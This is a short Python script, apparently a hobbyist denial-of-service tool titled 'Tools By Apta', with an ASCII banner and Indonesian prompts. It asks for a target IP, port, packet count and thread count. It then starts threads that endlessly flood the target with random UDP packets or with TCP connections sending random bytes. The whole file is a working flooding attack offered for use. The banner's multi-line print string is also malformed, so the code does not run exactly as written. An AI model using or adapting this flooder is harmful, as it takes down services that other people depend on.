import random
import socket
import threading

print       ("
███╗░░░███╗██████╗░░░░░█████╗░██████╗░████████╗
████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗╚══██╔══╝
██╔████╔██║██████╔╝░░░███████║██████╔╝░░░██║░░░
██║╚██╔╝██║██╔══██╗░░░██╔══██║██╔═══╝░░░░██║░░░
██║░╚═╝░██║██║░░██║██╗██║░░██║██║░░░░░░░░██║░░░
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝░░░░░░░░╚═╝░░░
░█████╗░
██╔══██╗
███████║
██╔══██║
██║░░██║
╚═╝░░╚═╝")
print       ("Tools By Apta")
print       ("Jangan Salah Gunakan Tools")                                   
print       ("Abuse Tools gw Delete Nih Tools")
print       (" - - > Tools V11   < - - ")
print       (" - - > Baca ya  < - - ")
print       (" - - >  How Are You Readyp?  < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" SERIUS MAU NYERANG? (y/n):"))
times = int(input(" Paket Nya Mau Berapa:"))
threads = int(input(" Pelor Nya Tembakin Berapa:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Mr.Apta Ready To Attack")
		except:
			print("[!] Otw ke tujuan!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Mr.Apta ready to attack")
		except:
			s.close()
			print("[*]Otw Ke Tujuan!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()